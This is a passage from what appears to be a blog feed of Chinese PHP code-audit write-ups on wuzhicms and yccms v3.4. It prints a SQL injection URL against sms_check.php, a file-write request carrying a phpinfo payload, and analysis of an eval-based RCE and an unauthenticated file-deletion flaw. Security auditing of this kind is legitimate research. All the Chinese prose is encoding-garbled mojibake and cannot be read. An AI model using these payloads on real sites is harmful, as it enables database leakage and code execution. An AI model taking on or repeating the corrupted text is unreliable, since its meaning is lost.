class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WWW_ROOT&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>), <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../configs/web_config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;core.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>])) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;éªŒè¯å¤±è´¥&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]==<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;éªŒè¯å¤±è´¥&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$posttime</span> = SYS_TIME-<span class="hljs-number">300</span>;<span class="hljs-comment">//5åˆ†é’Ÿå†…æœ‰æ•ˆ</span><br><span class="hljs-variable">$db</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;db&#x27;</span>);<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;sms_checkcode&#x27;</span>,<span class="hljs-string">&quot;`code`=&#x27;<span class="hljs-subst">$code</span>&#x27; AND `posttime`&gt;<span class="hljs-subst">$posttime</span>&quot;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;éªŒè¯é€šè¿‡&quot;,&quot;status&quot;:&quot;y&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;éªŒè¯å¤±è´¥&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php?param&#x3D;1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20â€“+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png" alt="20250717144135245"></p><h2 id="ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE"><a href="#ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE"></a>ä»»æ„æ–‡ä»¶å†™å…¥å¯¼è‡´RCE</h2><p>æœç´¢<code>file_put_contents()</code> å‡½æ•°,æ‰¾åˆ°ä¸€å¤„å†™å…¥å†…å®¹å¯æ§çš„åœ°æ–¹ã€‚file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;\r\n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?m=attachment<span class="hljs-variable">&amp;f</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;_su</span>=wuzhicms<span class="hljs-variable">&amp;v</span>=ueditor<span class="hljs-variable">&amp;submit</span>=1<span class="hljs-variable">&amp;setting</span>=%3Cphp%20phpinfo();%3E<br></code></pre></td></tr></table></figure><h2 id="æ–‡ç« ï¼š"><a href="#æ–‡ç« ï¼š" class="headerlink" title="æ–‡ç« ï¼š"></a>æ–‡ç« ï¼š</h2><p>äº”æŒ‡CMS 4.1.0å­˜åœ¨CSRFæ¼æ´å¯å¢åŠ ç®¡ç†å‘˜è´¦æˆ·</p><p><a href="https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/">https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</a></p><p>wuzhicmsä»£ç å®¡è®¡</p><p><a href="https://blog.csdn.net/RestoreJustice/article/details/129734772">https://blog.csdn.net/RestoreJustice/article/details/129734772</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms v3.4 ä»£ç å®¡è®¡</title>
    <link href="/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-ä»£ç å®¡è®¡"><a href="#yccms-v3-4-ä»£ç å®¡è®¡" class="headerlink" title="yccms v3.4 ä»£ç å®¡è®¡"></a>yccms v3.4 ä»£ç å®¡è®¡</h1><p>ç¨‹åºç‰ˆæœ¬ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png" alt="20250708090010810"></p><p>ä»è¿™ä¸ªç›®å½•ç»“æ„æ³¨æ„åˆ°è¿™æ˜¯ä¸€ä¸ªMVCæ¨¡å¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png" alt="20250708135815537"></p><h2 id="é€šè¯»ä»£ç "><a href="#é€šè¯»ä»£ç " class="headerlink" title="é€šè¯»ä»£ç "></a>é€šè¯»ä»£ç </h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>åå°å…¥å£</p><p>require  å¼•å…¥æ–‡ä»¶  &#x2F;config&#x2F;run.inc.php å®Œæˆç½‘ç«™çš„åˆå§‹åŒ–</p><p>è·¯ç”±ï¼šGET   &#x2F;admin?a&#x3D;</p><h3 id="ceshi1-ceshi2-compile"><a href="#ceshi1-ceshi2-compile" class="headerlink" title="ceshi1&amp;ceshi2&amp;compile"></a>ceshi1&amp;ceshi2&amp;compile</h3><p>éƒ½æ˜¯ä¸€äº›é¡µé¢æ¨¡æ¿</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><h4 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h4><p>æ•°æ®åº“ã€Smartyä»¥åŠå…¶ä»–çš„ç³»ç»Ÿé…ç½®</p><h4 id="count-php"><a href="#count-php" class="headerlink" title="count.php"></a>count.php</h4><p>é€šè¿‡è®¡ç®—æ ¹ç›®å½•ï¼ŒåŠ è½½ run.inc.phpæ–‡ä»¶</p><h4 id="run-inc-php"><a href="#run-inc-php" class="headerlink" title="run.inc.php"></a>run.inc.php</h4><p>åˆå§‹åŒ–æ–‡ä»¶ã€å…¥å£æ–‡ä»¶ï¼ˆè¿›å…¥åå°ä¼šè°ƒç”¨ï¼‰</p><p>åŠŸèƒ½ï¼š</p><ul><li><p>å¼€å¯sessionï¼Œè®¾ç½®ç¼–ç å’Œæ—¶åŒº</p></li><li><p>å¼•å…¥é…ç½®æ–‡ä»¶å’Œæ¨¡æ¿ï¼š<code>config/config.inc.php</code></p><p>â€‹    <code>/public/smarty/Smarty.class.php</code></p></li><li><p>è‡ªåŠ¨åŠ è½½ç±»ï¼š<code>__autoload()æ–¹æ³•ç”¨äºè‡ªåŠ¨åŠ è½½ç±»</code></p><p>â€‹                    Actionçš„ç±»åŠ è½½controller</p><p>â€‹                    Modelçš„ç±»åŠ è½½model</p><p>â€‹                    å…¶ä»–çš„ç±»åŠ è½½public&#x2F;class&#x2F;</p></li><li><p>å•å…¥å£ï¼š<code>Factory::setAction()-&gt;run();</code>è°ƒç”¨æ§åˆ¶å™¨çš„run()ï¼Œ</p></li></ul><p>å®‰å…¨é—®é¢˜ï¼šå…¥å£æ–‡ä»¶çš„Factoryç»™ä¸‹é¢çš„RCEæä¾›äº†å…¥å£ç‚¹</p><p>é…ç½®æ–‡ä»¶ä¼šæœ‰æ¼æ´å—ï¼Ÿé…ç½®æ–‡ä»¶ä¼šä¸ä¼šæ³„éœ²æ•°æ®åº“ä¿¡æ¯ï¼Ÿ</p><h3 id="contrller"><a href="#contrller" class="headerlink" title="contrller"></a>contrller</h3><h4 id="Action-class-php"><a href="#Action-class-php" class="headerlink" title="Action.class.php"></a>Action.class.php</h4><p>æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»</p><p>åŠŸèƒ½ï¼š</p><ul><li>å®šä¹‰å±æ€§</li><li>æ„é€ å‡½æ•°</li><li>åˆ†é¡µã€é™æ€åˆ†é¡µåŠŸèƒ½</li><li>æ§åˆ¶å™¨è¿è¡Œå…¥å£</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//æ§åˆ¶å™¨åŸºç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<span class="hljs-comment">//å£°æ˜Actionç±»ï¼Œå±äºæ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_tpl</span> = <span class="hljs-literal">null</span>;<span class="hljs-comment">//å®šä¹‰å±æ€§</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//__construct() æ„é€ å‡½æ•°ï¼Œå°±æ˜¯å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œç±»ä¸­è¢«è‡ªåŠ¨è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”ä¸€ä¸ªç±»ä¸­åªèƒ½å­˜åœ¨ä¸€ä¸ªæ„é€ å‡½æ•°ã€‚ä½†è¿™é‡Œæ˜¯protectedï¼Œå°±ä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨ç›´æ¥newè¿™ä¸ªç±»ï¼Œåªèƒ½åœ¨å­ç±»ä¸­é€šè¿‡ç»§æ‰¿ä½¿ç”¨ã€‚</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl = TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<span class="hljs-comment">//æ¨¡æ¿æ¸²æŸ“</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setModel</span>();<span class="hljs-comment">//åˆ›å»ºæ¨¡å‹å¯¹è±¡</span><br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">setRequest</span>(); <span class="hljs-comment">//è¡¨å•è½¬ä¹‰å’Œhtmlè¿‡æ»¤å¯ä»¥é˜²XSSã€SQL</span><br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªåˆ†é¡µå‡½æ•°</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Validate</span>::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_model</span>) ? <span class="hljs-variable language_">$this</span>-&gt;_model : <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">showpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><span class="hljs-comment">//é™æ€ä¸“ç”¨</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page2</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>,<span class="hljs-variable">$_url2</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_fx</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<span class="hljs-comment">//å¦ä¸€ç§åˆ†é¡µ</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>,<span class="hljs-variable">$_url2</span>,<span class="hljs-variable">$_fx</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">listpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//æ§åˆ¶å™¨è¿è¡Œå…¥å£</span><br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-comment">//urlä¼ å‚&#x27;?m=&#x27;,é»˜è®¤ä¸ºindex</span><br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<span class="hljs-comment">//eval() å¯ä»¥æ‰§è¡Œä»»æ„å­—ç¬¦ä¸²å½¢å¼çš„ PHP ä»£ç ï¼Œæ­¤å¤„é€šè¿‡æœç´¢å‘ç° run()å‡½æ•° å‡ºç°åœ¨ config/run.inc.php è¿™ä¸ªæ–‡ä»¶ï¼Œå­˜åœ¨rce</span><br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="AdminAction-class-php"><a href="#AdminAction-class-php" class="headerlink" title="AdminAction.class.php"></a>AdminAction.class.php</h4><p>ç®¡ç†å‘˜æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼š</p><ul><li><p>åŠ è½½åå°é¦–é¡µ</p></li><li><p>æ›´æ”¹å¯†ç ï¼šä½¿ç”¨sha1åŠ å¯†ä¸å®‰å…¨</p></li><li><p>ç³»ç»Ÿä¿¡æ¯æ˜¾ç¤ºï¼š</p><p>ç³»ç»Ÿä¿¡æ¯é¡µï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png" alt="20250711132213642"></p></li><li><p>é€€å‡ºæ—¶æ¸…ç†ç¼“å­˜ï¼šåˆ é™¤ compile ç›®å½•æ–‡ä»¶</p></li></ul><p>è·¯ç”±ï¼š?a&#x3D;admin&amp;m&#x3D;update -&gt; è°ƒç”¨ update()</p><h4 id="ArticleAction-class-php"><a href="#ArticleAction-class-php" class="headerlink" title="ArticleAction.class.php"></a>ArticleAction.class.php</h4><p>æ–‡ç« æ§åˆ¶å™¨ï¼Œ</p><p>åŠŸèƒ½ï¼šæ˜¾ç¤ºæ–‡ç« åˆ—è¡¨</p><p>â€‹æä¾›æœç´¢åŠŸèƒ½</p><p>â€‹å¢åˆ ä¿®æ”¹æ–‡ç« </p><p>â€‹navã€attrï¼ˆæ–‡ç« çš„ä¿®é¥°å±æ€§ï¼‰ç­‰åŠŸèƒ½</p><h4 id="CallAction-class-php"><a href="#CallAction-class-php" class="headerlink" title="CallAction.class.php"></a>CallAction.class.php</h4><p>åŠŸèƒ½ï¼š éªŒè¯ç ç”Ÿæˆ</p><p>â€‹åå°æ–‡ä»¶ä¸Šä¼ </p><p>â€‹ç¼–è¾‘å™¨ä¸Šä¼ </p><h4 id="HtmlAction-class-php"><a href="#HtmlAction-class-php" class="headerlink" title="HtmlAction.class.php"></a>HtmlAction.class.php</h4><p>ç”Ÿæˆé™æ€æ§åˆ¶å™¨</p><blockquote><p><strong>ç”Ÿæˆé™æ€é¡µé¢ï¼š</strong></p><p>é¦–å…ˆè°ƒç”¨æ¨¡å‹ï¼Œå–å‡ºæ•°æ®åº“å†…å®¹ï¼Œä¹‹åé€šè¿‡æ¨¡æ¿å¼•æ“æ¸²æŸ“é¡µé¢ï¼Œè¾“å‡ºHTMLé¡µé¢ï¼Œç„¶åä½¿ç”¨å·¥å…·ç±»<code>Tool::HtmlFile($filename, $content)</code>ï¼ŒæŠŠHTMLå†…å®¹ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„ï¼Œå°±å¯ä»¥åœ¨å‰ç«¯é¡µé¢æŸ¥çœ‹äº†ã€‚</p><p><strong>é™æ€é¡µé¢ä½œç”¨ï¼š</strong></p><ul><li>ç›´æ¥è®¿é—®<code>.html</code>æ–‡ä»¶ï¼Œä¸éœ€è¦è°ƒåŠ¨æ•°æ®åº“æŸ¥è¯¢ï¼›</li><li>é¡µé¢ç”Ÿæˆåä¸å†æ‰§è¡ŒåŠ¨æ€ä»£ç ï¼Œé˜²æ­¢SQLæ³¨å…¥ï¼›</li><li>å½“ç„¶ï¼Œè¿™ç§æŠŠå†…å®¹æå‰å‡†å¤‡å¥½çš„æ–¹å¼ï¼Œå¯¹äºæå‡æ€§èƒ½ã€å‡å°‘ç®—åŠ›ã€èŠ‚çº¦æœåŠ¡å™¨èµ„æºã€æœåŠ¡å™¨æ›´ç¨³å®šç­‰ç­‰æœ‰ä¸€å®šçš„ä¼˜åŠ¿ã€‚</li></ul></blockquote><p>æœ¬ç½‘ç«™åå°ä¿®æ”¹æ–‡ç« å†…å®¹åéœ€è¦<strong>é™æ€ç”Ÿæˆ</strong>ï¼Œä¹‹åæ–¹å¯åœ¨é¦–é¡µæ˜¾ç¤ºã€‚</p><p>åŠŸèƒ½ï¼š ç”Ÿæˆé¦–é¡µ</p><p>â€‹ç”Ÿæˆæ–‡ç« </p><p>â€‹æ ç›®åˆ—è¡¨</p><p>â€‹æ¨¡æ¿æ¸²æŸ“</p><p>â€‹é™æ€åŒ–è¾“å‡º</p><p>â€‹åˆ†æ­¥å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png" alt="20250711154124943"></p><h4 id="LinkAction-class-php"><a href="#LinkAction-class-php" class="headerlink" title="LinkAction.class.php"></a>LinkAction.class.php</h4><p>é“¾æ¥æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼šåå°ç®¡ç†å‹æƒ…é“¾æ¥ï¼Œä¿®æ”¹é“¾æ¥ã€æ’åºåŠŸèƒ½</p><h4 id="LoginAction-class-php"><a href="#LoginAction-class-php" class="headerlink" title="LoginAction.class.php"></a>LoginAction.class.php</h4><p>ç™»å½•æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼šç™»å½•éªŒè¯ï¼šsha1åŠ å¯†å¯†ç </p><p>â€‹éªŒè¯ç </p><p>â€‹è®°ä½å¯†ç </p><p>â€‹AJAX éªŒè¯</p><h4 id="NavAction-class-php"><a href="#NavAction-class-php" class="headerlink" title="NavAction.class.php"></a>NavAction.class.php</h4><p>åˆ†ç±»æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼šæŸ¥çœ‹ã€æ’åºã€å¢åˆ ä¿®æ”¹åˆ†ç±»åˆ—è¡¨</p><h4 id="PicAction-class-php"><a href="#PicAction-class-php" class="headerlink" title="PicAction.class.php"></a>PicAction.class.php</h4><p>å›¾ç‰‡æ§åˆ¶å™¨</p><p>åŠŸèƒ½ï¼š</p><ul><li><p>åå°å›¾ç‰‡å±•ç¤ºï¼šè¯»å–æ ¹ç›®å½•ä¸­çš„uploadsæ–‡ä»¶å¤¹ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ–‡ä»¶éæ³•åç¼€ï¼Œæ­¤å¤„å¯èƒ½ä¸Šä¼  .php æ–‡ä»¶</p></li><li><p>åˆ é™¤ï¼šæ²¡æœ‰æ£€éªŒå›¾ç‰‡è·¯å¾„ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</p></li><li><p>è¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œç”¨æˆ·æƒé™çš„åˆ¤æ–­ï¼Œéç®¡ç†å‘˜ï¼ˆæœªç™»å½•ï¼‰ç”¨æˆ·ä¹Ÿå¯è®¿é—®åˆ°å›¾ç‰‡åˆ—è¡¨å¹¶åˆ é™¤</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//å›¾ç‰‡æ§åˆ¶å™¨</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PicAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span>&#123;<br><span 